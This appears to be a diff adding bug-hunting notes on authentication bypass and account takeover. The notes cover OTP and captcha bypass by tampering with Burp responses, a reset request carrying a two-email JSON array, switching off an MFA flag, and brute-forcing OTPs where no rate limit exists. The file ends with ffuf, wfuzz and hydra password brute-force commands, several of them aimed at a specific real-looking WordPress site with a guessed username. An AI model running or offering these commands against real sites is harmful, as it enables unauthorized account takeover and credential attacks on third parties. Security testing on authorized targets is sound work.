@@ -1,0 +1,183 @@
+Authentication Bypass - OTP Bypass
+
+* Checking whether the OTP's are right or wrong improperly leads to bypass
+* Verifying at the client side only and taking decisions in dangerous
+* Only, allowing loging into based on true or false condiitions are dangerous.
+
+
+Method 01 : First of all, create an account, forget your password, intercept the request, and analyze whether you should find True/False/1/0 in plain text or decoded text. then again go to Create Another Account/Reset Password. Enter the random OTP after using Burp, and then when you find the OTP, forward this and do an intercept on the response. After that, manipulate this from 404 to 200, incorrect to correct, 0 to 1, error to success, or false to true.
+
+Method 02 : 1st create a account in a site and when login the account intercept not only request but also response. then analyze that you should find True/False/1/0 in a plain text or decoding text. when you find the things copy that when correct login. After successful login again login 2nd account and give the wrong password. and intercept not only request but also response and analyze it and paste the plain/decoding text. if you login successfully that means here is Account TakeOver by Response Manipulation
+
+Method 03 : Go to Forget Pass and put the right OTP and intercept request and response also. and focus on 200/1/success/true, etc. Now go to forget pass and put the wrong OTP and intercept request and response also. and change 404 to 200 or incorrect to correct or 0 to 1 or error to success or false to true, etc. If we bypass it, that means there is a bug. Youcan change your Gmail or phone number and maybe login to their account
+
+Method 04 : First Create an account, then go to Forget Pass and intercept response with Burp Suite and try to find a token. If you find a token, that's great, and then go to the mail, and from the mail you also find the token. If the tokens match, that means there is an account takeover. You can change the victim email address as well.
+
+Method 05 : Start your Burp then do intercept to response and then change to id/userid/uid [Give the right OTP
+
+Method 06 : first go to forget password and enter your mail and intercept it before sending the request, and you can see your mail in JSON format. You are adding another email like this. If you receive both OTPs, that means there is an Account TakeOver Bug.
+
+{
+	"email" :[
+	"target@gmail.com","attacker@gmail.com"	]
+}
+
+Method 07 : Start your Burp then do an intercept to response, then if you find the OTP that means you can easily login
+
+Method 08 : Start your Burp then do intercept and go to repeater then find mfa then change to 0 [1 means on and 0 means off][mfa means multifactor login]
+
+Authentication Bypass - Captcha Bypass
+
+* Using response manipulation
+* Verifying at the client side only and taking decisions in dangerous
+
+Method 01:
+when you are finding a captcha in a login form or registration form. FIllup the form and solve the captcha after solving intercept with burp
+
+---> 1st you delete the captcha request and go forward if registration or login done that means this is bug
+
+https://www.youtube.com/watch?v=AGKbBf0MYiA
+https://www.youtube.com/watch?v=wC_ULxXNpfE
+
+Account Takeover:
+
+* Mapping users as per uid, gid, and other parameters like user_id, user=, etc. is good.
+* until proper checks and access control are in place.
+* Log in to other users accounts by just using their userids.
+
+For bug hunting First, analyze the whole website, mainly how the login function works and how OTP works. Check the request and response and copy the response to the notepad.
+
+Method 01: First Create an account on a site, intercept it with burp, and analyze it. then go to forget pass and request an OTP. You can try Authentication Bypass by giving the wrong OTP and seeing the false request, then editing those requests, and if you login to the account, that means this is Authentication Bypass. then now moving to account takeover If you are finding any typer uid or id in your response, try changing those ids and forwarding them. If you see that you are logging in to another account, that means it is an account takeover.
+
+
+Interesting account takeover due to OTP exposure:
+
+* Some web applications reveal their right OTP or verification code in the response themselves.
+* Many websites are vulnerable to this attack because the website reveals a verification code to the attacker, which is going to be sent to the victim's device.
+
+First of all, create an account, and when sending OTPS, intercept it and see the response very carefully. If you find any OTP and match the OTP on your mobile, the owner is sent. If both match, that means there is a bug.
+
+interesting Account takeover due to 2FA logic Flaw:
+
+* Doing an email account takeover of anyone, ue to a logic flaw on the website
+
+Method 01 : Start your Burp then do intercept and go to repeater then find mfa then change to 0 [1 means on and 0 means off][mfa means multifactor login]
+
+Interesting Account takeover of support and CEO email due to logic Flaw:
+
+* Doing an email account takeover of anyone, due to a logiv flaw on the website.
+
+Method 01 : First, create an account with the email and verify it with the email, then, after some time, add another mail and try to verify the previous activation link from the first mail. If it is done, that means there is a bug.
+
+
+Authentication Bypass - Mitigations:
+
+* Donot rely only on client side, Checks at server side and are important
+* Verifying at the client side only and taking  decisions is dangerous
+* Use Authentication based on strong TOken JWT mechanism
+* Use authentication based on encrypted data which can be AES for example
+
+No Rate limit to Account Takeover :
+
+* We will send x number of simultaneous requests to the server and server will act on each request
+* Thus making x number of email accounts on the website
+* No validation or limiting the requests and taking deisions in dangerous
+
+First of all, go to the signup page, fill out that, and then intercept with burp, check, and find the interesting things. Must be sent to the repeater and intruder also. then in the intruder tab, target the mail and set some email as a wordlist like 10/15 emails, and then start the attack. If the response is 200, that means this is a bug and then test it as a try to login those mail and password
+
+
+No Rate limit leads to Account Takeover :
+
+* We will send X number of simultaneous requests to the server and server will act on each request
+* Thus by sending x number of right otp token,Password we can successfully crack the code
+* No validation or limiting the requests and taking decisions is dangerous
+
+First of all go to signup page then enter your phone number and then give to wrong otp then interept with burp and send to repetear and intruder . go to intruder tab target to otp and attack before the attack change to some settings.
+Options > Request Engine > Fixed > 3000 [3000ms = 3s]
+If the website has no rate limmit you can find your right OTP. then copy the right response of OTP and paste to repeater. then if your otp is login that means here is a bug
+
+Finding The No Rate Limit:
+First of all, go to the signup page, then create a new account, then go to forgetpass, then give the email or phone number, then intercept it. analyze it and find the email, then go to intruder and set the null payload 100 times and hit attack.
+
+
+
+No Rate Limit on OTP vesity leads to ATO
+
+* We will send x number of simulataneous requests to the server and server will act on each requests.
+* Thus by sending x number of right otp token, password we can successfully crack the code
+* No validation or limiting the request and taking decisions is dangerous.
+
+Best method for finding no rate limit: 
+
+Race Hazard : Options > Request Engine > Fixed > 3000 [3000ms = 3s]
+IP rotation : like changing ips after a time
+
+Source : https://thezerohack.com/hack-any-instagram
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Brute Force Attack in AnyLogin Page:
+
+There are some ways to bruteforce a Login page. You need BurpSuite, BurpSuite Pro, Hydra, Fuzz, Wfuzz etc.
+
+BurpSuite : first intercept the request, then go to the intruder and target admin or password, and then start the attack Then Using FFUF tool.
+
+Method 01: First, intercept with a burp and send it to the repeater, then find the response and send it to the intruder, then select the target, select the wordlist, and attack. 
+
+Method 02:
+This is For Bruteforce finding admin and pass:
+--> first give wrong username and password and intercept the request and copy to file and svae it
+--> then if you want to find the username so use "username=FUZZ" or you want to find the password "password=FUZZ"
+--> ffuf -request req.txt -request-proto http -w /usr/share/seclists/Passwords/any txt file -mc 200
+--> ffuf -request req.txt -request-proto http -w /usr/share/seclists/Passwords/any txt file -fs <file_size>
+--> ffuf -request req.txt -request-proto http -mode cluster-bomb -w /usr/share/seclists/Passwords/any txt file -mc 200
+--> ffuf -request req.txt -request-proto http -w passlist.txt -fs 30
+
+ffuf -request req.txt -w passlist.txt:USER -w passlist.txt:PASS -mc all -fc 500,401 ["user":"USER","password":"PASS"]
+ffuf -w usernames.txt:W1,passlist.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://localhost:3000/login -fc 200
+ffuf -request req.txt -request-proto http -mode clusterbomb -w usernames.txt:HFUZZ -w passwords.txt:WFUZZ
+
+wfuzz -c -z file,pass.txt --hc 404 -u http://abc.xyz/FUZZ
+wfuzz -c -z file,pass.txt --hs Invalid -d "log=admin&pwd=FUZZ" -u https://example.com/wp-login.php
+wfuzz -c -z file,passlist.txt --hs Invalid -d "log=banglachoti&pwd=FUZZ" -u https://banglachoti.live/wp-login.php
+wfuzz -c -z file,username.txt -z file,password.txt -b "Cookie=" -d "log=FUZZ&pwd=FUZZ2Z" -u http://example.xyz
+
+hydra -l admin -P passlist.txt https://banglachoti.live/wp-login.php http-post-form "log=^USER^&pwd=^PASS^&wp-submit=Log+In:Incorrect"
+hydra -l banglachoti -P passlist.txt http-post-form://banglachoti.live/wp-login.php:"log=^USER^&pwd=^PASS^&wp-submit=Log+In:Incorrect"
+hydra link -l admin -P passlist.txt http-post-form "/login.php:username=^USER^&password=^PASS^:F=Login Failed"
+hydra banglachoti.live -l banglachoti -P passlist.txt http-post-form "/wp-login.php:username=^USER^&password=^PASS^:F= The password you entered for the username banglachoti is incorrect."
